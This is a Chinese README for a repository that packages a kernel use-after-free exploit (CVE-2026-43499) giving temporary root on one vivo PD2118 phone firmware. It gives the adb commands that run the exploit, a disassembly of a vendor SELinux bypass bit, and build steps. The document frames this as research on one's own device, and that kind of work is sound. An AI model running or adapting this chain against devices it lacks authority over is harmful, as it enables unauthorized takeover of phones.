# ghostlock-pd2118c — PD2118 临时 root（可复现实现）

CVE-2026-43499（futex PI UAF）在 **iQOO Neo5 活力版 / PD2118 / V2118A**、
内核 `4.19.152-perf+`、固件 `PD2118_A_9.5.3` 上的完整实现。
本仓库保存的是**实机验证拿到 root 后**的源码与配套工具。

## 它能做到什么

```
adb push build/ghostlock_pd2118 /data/local/tmp/ghostlock
adb shell chmod 755 /data/local/tmp/ghostlock
adb shell 'cd /data/local/tmp && GHOSTLOCK_ROOT5=1 ./ghostlock'
# ~40 s 后
adb shell '/data/local/tmp/su -c id'
# uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

拿到的是**临时 root**：守护进程在内存里，重启失效，需要重新跑。
SELinux 全局仍是 `Enforcing`；提权后的进程靠 per-task 的
`thread_info.flags` bit63 绕过 AVC 拒绝，而不是关掉系统的 SELinux。

## 和同名的另一份实现的关系

同一目标机型已有另一份公开实现（`ghostlock-pd2118c-4.19.152`），它完成了
L1（触发）、L2（写/读原语）、L3（`cred` 换成 `init_cred` → `uid 0`），
但在 L4 停下，结论是「`kernel` 域没有 `dac_override`、没有 `entrypoint`、
全域没有 `setenforce` allow，所以不存在纯 exploit 型临时 root」。

这个结论只对**标准 SELinux 语义**成立。本机 vendor 在拒绝路径上多了一个分支：

```
avc_has_perm @0x4a3440
  0x4a3440: ldr  x8, [x25]        ; x25 = current (sp_el0), task->thread_info.flags
  0x4a3444: asr  x8, x8, #63      ; 取符号位
  0x4a3448: bic  w25, w0, w8      ; bit63=1 -> denied & 0 -> 放行
```

`thread_info.flags` 的 **bit63 = 1** 时，该任务的 SELinux 拒绝被忽略
（等价 per-task permissive）。上面那三堵墙全部是 AVC 拒绝，一个位全绕。
本仓库的 ROOT5 路径就是照这个事实写的，详见 `docs/02-root5.md`。


## 目录

| 路径 | 内容 |
|---|---|
| `src/` | 提权主链（C + 汇编），`targets/vivo-pd2118-9.5.3/target.h` 是本机常量 |
| `src/kernelsnitch/` | futex hash 碰撞 / mm_struct 地址泄漏 |
| `build/embed/` | 内嵌 su daemon 的预编译 PIE（源码 `src/su_daemon.c`） |
| `assets/` | 内嵌壁纸素材 |
| `build_953.sh` | 构建入口（zig 0.14.1，aarch64-linux-musl，静态） |
| `tools/` | 模块指纹补丁、APK 重打包/换签、源码打包脚本 |
| `docs/` | 复现要点与排错记录（已脱敏） |

## 构建

依赖 zig 0.14.1（其他版本未验证）：

```bash
export ZIG=/path/to/zig
./build_953.sh
# 产物：build/ghostlock_pd2118、build/ksprobe
```

若需要重建内嵌 su daemon：

```bash
"$ZIG" c++ -target aarch64-linux-musl -O2 -pie -fPIC \
  src/su_daemon.c -o build/embed/su_daemon_aarch64_pie
./build_953.sh
```

注意：zig 的构建缓存不把 `.incbin` 的文件当依赖，所以 `build_953.sh` 每次都会
重写 `src/su_blob.S`（带时间戳注释），否则会一直嵌入旧的 blob。

## 设备侧用法

```bash
adb push build/ghostlock_pd2118 /data/local/tmp/ghostlock
adb shell chmod 755 /data/local/tmp/ghostlock
adb shell 'cd /data/local/tmp && GHOSTLOCK_ROOT5=1 ./ghostlock'
adb shell '/data/local/tmp/su -c id'
```

成功日志的标志行：

```
[+] root5: verdict=[ROOT5_OK uid=0 mount=0 sock=1]
[*] root5: client connect=0 errno=0 out=[uid=0(root)]
```

若重装过 KernelSU 管理器（uid 会变），用 `ghostlock/bind_manager.sh` 重新认领；
模块内嵌证书指纹的替换与重签见 `tools/release_sign.py` 与 `TOOLS.md`。

## 已知限制

- 临时 root，重启失效；整套链依赖 PD2118 / `PD2118C_A_9.5.3` / `4.19.152-perf+`
  的具体偏移，**换固件必须重推**（偏移请从 boot.img 现算并反算校验）。
- 建议先 `adb reboot` 再跑；跑完尽快重启，避免系统长时间在不稳定状态运行。
- 模块来自 PD2055 的预编译产物，靠 koreloc 按当次 KASLR 重定位；上游未提供其源码。
- 仅用于自己拥有设备上的安全研究，不提供任何担保。

## 许可

Apache-2.0，见 `LICENSE`；上游归属见 `NOTICE`。
